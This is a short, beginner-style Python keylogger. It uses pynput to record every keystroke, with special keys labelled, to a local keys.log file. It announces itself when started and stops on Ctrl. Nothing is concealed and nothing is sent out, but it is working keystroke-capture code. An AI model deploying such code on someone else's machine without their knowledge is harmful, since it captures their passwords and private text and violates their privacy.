#Make sure you have pynput library
from pynput import keyboard

#File name so save log
LOG_FILE = "keys.log"

def keyPressed(key):
    with open(LOG_FILE, 'a') as file:
        try:
            #Handle common char
            file.write(key.char)
        except AttributeError:
            #Handle special char (shift, enter, ..)
            if key == keyboard.Key.space:
                file.write(" ") #Space for button space
            elif key == keyboard.Key.enter:
                file.write("\n") #\n for enter
            elif key == keyboard.Key.backspace:
                file.write("[X]") 
            else:
                file.write(f"[{key.name.upper()}]")

def on_press(key):
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        print("\n Ctrl detected. Stopping...")
        return False
    keyPressed(key)

def main():
    print("Keylogger start.. (click Ctrl to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
